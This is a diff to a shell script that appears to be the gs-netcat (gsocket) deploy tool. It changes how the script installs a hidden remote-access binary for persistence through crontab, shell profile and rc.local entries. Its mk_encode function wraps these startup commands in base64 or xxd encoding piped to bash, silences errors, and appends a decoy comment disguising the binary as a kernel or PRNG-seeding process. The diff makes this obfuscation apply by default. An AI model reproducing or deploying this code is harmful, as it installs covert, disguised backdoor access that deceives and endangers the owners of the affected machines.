@@ -715,6 +715,7 @@ init_vars()
 		fi
 	}
 
+	# Unset so that test_dstbin() can test -g parameter without exiting.
 	unset GSNC
 	unset OSARCH
 	unset SRC_PKG
@@ -803,8 +804,10 @@ init_vars()
 	[[ -z "$UID" ]] && UID=$(id -u)
 
 	# check that xxd is working as expected (alpine linux does not have -r option)
-	try_encode "base64" "base64 -w0" "base64 -d"
-	try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
+	[[ -z "$GS_NOENC" ]] && {
+		try_encode "base64" "base64 -w0" "base64 -d"
+		try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
+	}
 	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
 	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_mini-${OSARCH}.tar.gz"
 
@@ -960,7 +963,13 @@ init_vars()
 mk_encode() {
 	local str
 	str="$(echo "$(date)${HOSTNAME}-FOOBAR" | md5sum | sed 's/[^a-f0-9]//g')"
-	echo "{ echo $(echo "$1"|${ENCODE_STR})|${DECODE_STR}|bash;} 2>/dev/null #${str:-4a50524e47} >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
+	str="${str:0:8}"
+	str="2>/dev/null #${str:-4a50524e} >/dev/random # ${BIN_HIDDEN_NAME}-kernel"
+	if [[ -n "$ENCODE_STR" ]]; then 
+		echo "{ echo $(echo "$1"|${ENCODE_STR})|${DECODE_STR}|bash;} ${str}"
+	else
+		echo "${1} ${str}"
+	fi
 }
 
 init_setup()
@@ -1005,9 +1014,9 @@ init_setup()
 	if [[ $OSTYPE == *linux* ]]; then
 		[[ -n "$LDSO" ]] && str="${LDSO} "
 		# Under Linux the gsnc binary check's itself and exits if already running.
-		PROFILE_LINE="${str}'${DSTBIN}' 2>/dev/null"
-		CRONTAB_LINE="${str}'${DSTBIN}' 2>/dev/null"
-		RCLOCAL_LINE="${str}'${DSTBIN}' 2>/dev/null"
+		PROFILE_LINE="${str}'${DSTBIN}'"
+		CRONTAB_LINE="${str}'${DSTBIN}'"
+		RCLOCAL_LINE="${str}'${DSTBIN}'"
 	else 
 		RCLOCAL_LINE="'${DSTBIN}' 2>/dev/null" # Only executed ONCE at bootup
 		PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} '${KL_NAME}' 2>/dev/null || '${DSTBIN}' 2>/dev/null"
@@ -1015,11 +1024,9 @@ init_setup()
 		CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} '${KL_NAME}' 2>/dev/null || '${DSTBIN}' 2>/dev/null"
 	fi
 
-	if [[ -n $ENCODE_STR ]]; then
-		RCLOCAL_LINE="$(mk_encode "$RCLOCAL_LINE")"
-		PROFILE_LINE="$(mk_encode "$PROFILE_LINE")"
-		CRONTAB_LINE="$(mk_encode "$CRONTAB_LINE")"
-	fi
+	RCLOCAL_LINE="$(mk_encode "$RCLOCAL_LINE")"
+	PROFILE_LINE="$(mk_encode "$PROFILE_LINE")"
+	CRONTAB_LINE="$(mk_encode "$CRONTAB_LINE")"
 
 	DEBUGF "_GS_TMPDIR=${_GS_TMPDIR}"
 	DEBUGF "DSTBIN_EXEC_ARR=${DSTBIN_EXEC_ARR[*]}"
@@ -1796,7 +1803,7 @@ gs_access()
 	local ret
 	GS_SECRET="${S}"
 
-	GS_SECRET="${GS_SECRET}" "${DSTBIN_EXEC_ARR[@]}" -i
+	GS_CONFIG_READ=0 GS_SECRET="${GS_SECRET}" "${DSTBIN_EXEC_ARR[@]}" -i
 	ret=$?
 	[[ $ret -eq 139 ]] && { WARN_EXECFAIL_SET "$ret" "SIGSEGV"; WARN_EXECFAIL; errexit; }
 	[[ $ret -eq 61 ]] && {
